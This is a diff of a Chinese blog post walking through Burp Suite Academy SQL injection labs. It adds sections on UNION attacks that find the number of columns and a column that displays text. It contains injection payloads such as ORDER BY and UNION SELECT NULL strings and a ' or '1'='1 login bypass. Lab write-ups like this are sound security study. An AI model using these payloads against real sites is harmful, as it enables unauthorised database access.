@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211162236391.jpg">
 <meta property="article:published_time" content="2022-11-16T14:31:35.000Z">
-<meta property="article:modified_time" content="2022-11-16T14:52:14.908Z">
+<meta property="article:modified_time" content="2022-11-17T10:45:34.004Z">
 <meta property="article:author" content="QY">
 <meta property="article:tag" content="burpsuite靶场">
 <meta property="article:tag" content="sql注入">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          326 字
+          744 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          3 分钟
+          7 分钟
         
       </span>
     
@@ -299,6 +299,20 @@
 <p>或者使用万能密码</p>
 <figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;+or+</span><span class="hljs-symbol">&#x27;1</span><span class="hljs-symbol">&#x27;=</span><span class="hljs-symbol">&#x27;1</span><br></code></pre></td></tr></table></figure>
 
+<hr>
+<h3 id="3-SQL-注入-UNION-攻击，确定查询返回的列数"><a href="#3-SQL-注入-UNION-攻击，确定查询返回的列数" class="headerlink" title="3.SQL 注入 UNION 攻击，确定查询返回的列数"></a>3.SQL 注入 UNION 攻击，确定查询返回的列数</h3><p>这一关需要我们判断列数，联合查询判断列数的方法常用两种</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+  </span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>这里列数为三因此输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; order by 3 --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-comment">--+ //这里只是判断列数但是吗，没有地方回显因此填null如果填数值会一直错</span><br></code></pre></td></tr></table></figure>
+
+<p>完成</p>
+<h3 id="4-SQL-注入-UNION-攻击，查找包含文本的列"><a href="#4-SQL-注入-UNION-攻击，查找包含文本的列" class="headerlink" title="4.SQL 注入 UNION 攻击，查找包含文本的列"></a>4.SQL 注入 UNION 攻击，查找包含文本的列</h3><p>前面知道了有三列</p>
+<p>现在这关是让我们测试他的回显，三列在回显的地方填数据，不回显填null</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-symbol">&#x27;abcdef</span>&#x27;,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- </span><br>&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">null</span>,<span class="hljs-symbol">&#x27;abcdef</span>&#x27;,<span class="hljs-keyword">NULL</span><span class="hljs-comment">--</span><br>&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">null</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-symbol">&#x27;abcdef</span>&#x27;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211171153773.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>当不报错时就是完成了实验</p>
 
                 
               </div>
